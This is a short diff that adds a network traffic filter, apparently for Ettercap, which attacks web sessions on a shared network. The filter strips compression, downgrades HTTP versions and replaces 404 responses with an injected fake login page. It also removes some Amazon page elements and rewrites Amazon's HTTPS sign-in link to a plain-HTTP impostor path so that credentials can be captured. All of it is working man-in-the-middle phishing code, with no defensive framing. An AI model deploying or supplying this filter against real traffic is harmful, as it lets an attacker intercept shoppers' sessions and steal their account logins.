@@ -1,0 +1,25 @@
+if (ip.proto == TCP && tcp.dst == 80) {
+	if (search(DATA.data, "Accept-Encoding")) {
+		replace("Accept-Encoding", "Accept-Nothing!");
+	}
+	if (search(DATA.data, "HTTP/1.1")) {
+		replace("HTTP/1.1", "HTTP/1.0");
+	}
+}
+if (ip.proto == TCP && tcp.src == 80) {
+	if (search(DATA.data, "404 Not Found")) {
+		drop();
+		inject("/home/jl/dev/workspace/wide-eyes/hacks/amazon/login.html");
+		msg("Injected fake login page");
+	}
+	if (search(DATA.data, "The Web address you entered")) {
+		drop();
+	}
+	if (search(DATA.data, "amabot_widget")) {
+		drop();
+	}
+	if (search(DATA.data, "https://www.amazon.com/ap/signin")) {
+		replace("https://www.amazon.com/ap/signin", "http://www.amazon.com/my-signin");
+		msg("Injected bad login link");
+	}
+}
